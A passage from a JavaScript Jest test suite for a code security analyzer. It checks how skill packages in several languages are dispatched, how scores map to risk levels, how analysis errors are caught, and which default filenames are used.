        filename: 'main.go', errors: [], warnings: [], info: [], score: 100, riskLevel: 'low', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(spy).toHaveBeenCalled();
      expect(report.summary.filesAnalyzed).toBe(1);
    });

    it('analyzes Rust files', async () => {
      fs.readdirSync.mockReturnValue(['lib.rs']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('fn main() {}');
      const spy = jest.spyOn(analyzer, 'analyzeRust').mockResolvedValue({
        filename: 'lib.rs', errors: [], warnings: [], info: [], score: 100, riskLevel: 'low', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(spy).toHaveBeenCalled();
      expect(report.summary.filesAnalyzed).toBe(1);
    });

    it('analyzes C++ files', async () => {
      fs.readdirSync.mockReturnValue(['main.cpp', 'util.h']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('int main() { return 0; }');
      const spy = jest.spyOn(analyzer, 'analyzeCpp').mockResolvedValue({
        filename: 'main.cpp', errors: [], warnings: [], info: [], score: 100, riskLevel: 'low', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(spy).toHaveBeenCalledTimes(2);
      expect(report.summary.filesAnalyzed).toBe(2);
    });

    it('analyzes C files', async () => {
      fs.readdirSync.mockReturnValue(['main.c']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('int main() { return 0; }');
      const spy = jest.spyOn(analyzer, 'analyzeCpp').mockResolvedValue({
        filename: 'main.c', errors: [], warnings: [], info: [], score: 100, riskLevel: 'low', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(spy).toHaveBeenCalled();
      expect(report.summary.filesAnalyzed).toBe(1);
    });

    it('marks risk level high when score below 50', async () => {
      fs.readdirSync.mockReturnValue(['a.js']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('eval("x")');
      jest.spyOn(analyzer, 'analyzeJavaScript').mockResolvedValue({
        filename: 'a.js', errors: [{ severity: 'error' }], warnings: [], info: [], score: 40, riskLevel: 'high', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.overallScore).toBe(40);
      expect(report.riskLevel).toBe('high');
    });

    it('marks risk level medium when score below 70', async () => {
      fs.readdirSync.mockReturnValue(['a.js']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('eval("x")');
      jest.spyOn(analyzer, 'analyzeJavaScript').mockResolvedValue({
        filename: 'a.js', errors: [{ severity: 'error' }], warnings: [], info: [], score: 60, riskLevel: 'medium', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.overallScore).toBe(60);
      expect(report.riskLevel).toBe('medium');
    });

    it('marks risk level minimal when score at least 85', async () => {
      fs.readdirSync.mockReturnValue(['a.js']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('const x = 1');
      jest.spyOn(analyzer, 'analyzeJavaScript').mockResolvedValue({
        filename: 'a.js', errors: [], warnings: [], info: [], score: 90, riskLevel: 'minimal', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.overallScore).toBe(90);
      expect(report.riskLevel).toBe('minimal');
    });
  });

  /* ========== ERROR HANDLING ========== */
  describe('error handling', () => {
    it('catches errors in analyzeJavaScript and returns results', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('pattern crash'); });
      const res = await analyzer.analyzeJavaScript('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzePython', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzePython('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzeShell', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzeShell('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzeJava', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzeJava('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzeGo', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzeGo('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzeRust', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzeRust('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('catches errors in analyzeCpp', async () => {
      jest.spyOn(analyzer, '_detectPatterns').mockImplementation(() => { throw new Error('crash'); });
      const res = await analyzer.analyzeCpp('code');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'ANALYSIS_ERROR' })
        ])
      );
    });

    it('handles null code gracefully', async () => {
      const res = await analyzer.analyzeJavaScript(null);
      expect(res.errors).toHaveLength(0);
      expect(res.score).toBe(100);
    });

    it('handles undefined code gracefully', async () => {
      const res = await analyzer.analyzeJavaScript(undefined);
      expect(res.score).toBe(100);
    });
  });

  /* ========== FILENAME CUSTOMIZATION ========== */
  describe('filename customization', () => {
    it('passes custom filename to results', async () => {
      const res = await analyzer.analyzeJavaScript('const x = 1', 'custom.js');
      expect(res.filename).toBe('custom.js');
    });

    it('uses default filename for each language', async () => {
      expect((await analyzer.analyzeJavaScript('')).filename).toBe('code.js');
      expect((await analyzer.analyzePython('')).filename).toBe('code.py');
      expect((await analyzer.analyzeShell('')).filename).toBe('script.sh');
      expect((await analyzer.analyzeJava('')).filename).toBe('code.java');
      expect((await analyzer.analyzeGo('')).filename).toBe('code.go');
      expect((await analyzer.analyzeRust('')).filename).toBe('code.rs');
      expect((await analyzer.analyzeCpp('')).filename).toBe('code.cpp');
    });
  });
});
